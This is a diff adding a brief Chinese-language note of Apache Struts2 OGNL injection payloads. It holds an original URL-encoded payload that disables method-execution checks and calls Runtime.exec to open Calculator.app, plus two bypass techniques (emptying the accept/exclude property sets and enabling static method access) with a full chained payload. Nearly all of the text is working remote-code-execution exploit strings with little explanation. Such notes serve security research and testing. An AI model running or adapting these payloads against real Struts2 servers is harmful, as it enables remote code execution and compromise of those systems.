@@ -1,0 +1,13 @@
+
+之前的:
+
+(%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27)(racerz)(racerz)&('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('racerz')
+
+绕过1:
+isAccepted() 和 isExcluded() 限制 直接设置对应的判断集合acceptProperties为空集 
+
+绕过2:
+高版本 struts2 （> 2.1.2）会存在allowStaticMethodAccess=false, 需要设置为true
+(%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27)(racerz)(racerz)&(%27%5Cu0023_memberAccess.acceptProperties%5Cu003d@java.util.Collections@EMPTY_SET%27)(racerz)(racerz)&(%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27)(racerz)(racerz)&(%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27)(racerz)(racerz)&('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('racerz')
+
+
